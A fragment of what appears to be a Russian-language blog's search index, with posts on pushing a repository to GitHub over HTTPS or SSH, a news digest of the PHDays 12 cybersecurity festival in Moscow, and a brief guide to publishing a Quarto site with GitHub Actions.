    "text": "Как залить коммит на Github?\nЕсли не был создан проект на Github, то необходимо его создать:\n[Pasted image 20230902102155.png]\nДалее необходимо вписать название проекта. Можно также добавить описание и настроить доступность проекта:\n[Screenshot_20230902_102527.png]\nПосле нажатия на большую зелёную кнопку Create repository будет успешно создан проект на Github. Теперь можно подключить к нашему git-репозиторию удалённый репозиторий:\ngit remote add origin https://github.com/имя_пользователя/название_проекта\nТеперь можно, наконец, запушить проект:\ngit push origin master"
  },
  {
    "objectID": "posts/git/git.html#если-не-запушилось",
    "href": "posts/git/git.html#если-не-запушилось",
    "title": "Как запушить на Github?",
    "section": "Если не запушилось",
    "text": "Если не запушилось\nЕсли не запушилось, то необходимо настроить подключение к Github с помощью ssh:\ngit remote set-url origin ssh://git@github.com:имя_пользователя/название_проекта.git\nДалее необходимо создать ssh-ключи:\nssh-keygen -C \"электронная почта\"\nПолучим публичный ключ:\ncat ~/.ssh/id_rsa.pub\nТеперь необходимо добавить ключ (New ssh key):\n[Screenshot_20230902_110500.png]\nПосле добавления можно попробовать запушить ещё раз:\ngit push origin master"
  },
  {
    "objectID": "posts/phdays/phdays.html",
    "href": "posts/phdays/phdays.html",
    "title": "PHDays 12",
    "section": "",
    "text": "Компания Positive Technologies, лидер в области результативной кибербезопасности, проводит Positive Hack Days уже в 12-й раз. В этом году мероприятие впервые проходит в одном из самых популярных парков Москвы — Парке Горького — и предназначено не только для профессионального сообщества, но и для широкой аудитории. В условиях повсеместной цифровизации кибербезопасность касается каждого человека, и PHDays предлагает ближе познакомиться с новыми технологиями, научиться их контролировать и избегать киберугроз.\nВ Парке Горького построен настоящий кибергород, любой посетитель которого может совершенно бесплатно поучаствовать в квестах и в итоге получить знания о киберзащищенности. Во второй масштабной локации — на территории безопасности, располагающейся на набережной и объединяющей пять технических треков и бизнес-программу, — уже прошли десятки профессиональных выступлений (всего их будет более 200). В пленарной сессии принял участие министр цифрового развития, связи и массовых коммуникаций Максут Шадаев.\nКиберфестиваль продолжается, впереди самое интересное, а пока представляем краткий дайджест событий первого дня. За выступлениями и соревнованиями также можно наблюдать онлайн на сайте PHDays.\nОткрыл мероприятие Денис Баранов, генеральный директор Positive Technologies:\n\nВ России есть огромная и развитая сфера IT: люди пользуются цифровыми банками и вызывают такси со смартфона. Рядом с ней есть отрасль кибербезопасности — высокотехнологичная, очень интересная, со своими вызовами. Хакеры чуть ли не ежедневно атакуют компании, пользователей, поезда, заводы, и героические ребята с другой стороны баррикад защищают цифровые системы для того, чтобы современная цивилизация не была уничтожена. Мы решили выйти в Парк Горького, чтобы немного поделиться кулуарным миром ИБ, а пользователи, далекие от этой сферы, могли, как в щелочку, на него посмотреть. –  Денис Баранов"
  },
  {
    "objectID": "posts/github workflow/workflow.html",
    "href": "posts/github workflow/workflow.html",
    "title": "Как осилить Github Actions?",
    "section": "",
    "text": "Я осилил Github Actions. А ты?"
  },
  {
    "objectID": "posts/github workflow/workflow.html#как-осилить",
    "href": "posts/github workflow/workflow.html#как-осилить",
    "title": "Как осилить Github Actions?",
    "section": "Как осилить?",
    "text": "Как осилить?\n\nСкачиваем файл отсюда и закидываем его в репозиторий как .github/workflows/quarto-publish.yml\nВнутри файла меняем название репозитория на тот, где находятся файлы с .qmd-файлами. В моём случае это так:\n\non:\n  push:\n    branches: master\n\nРаскомменчиваем пункт с Github Pages\nЗапускаем quarto publish gh-pages\nКоммитим изменения в репозиторий (master/main)\nВнутри Github выставляем разрешение боту на запись и чтение репозитория\nСтавим страницу в Pages на gh-pages\n\nГотово!"
  }
]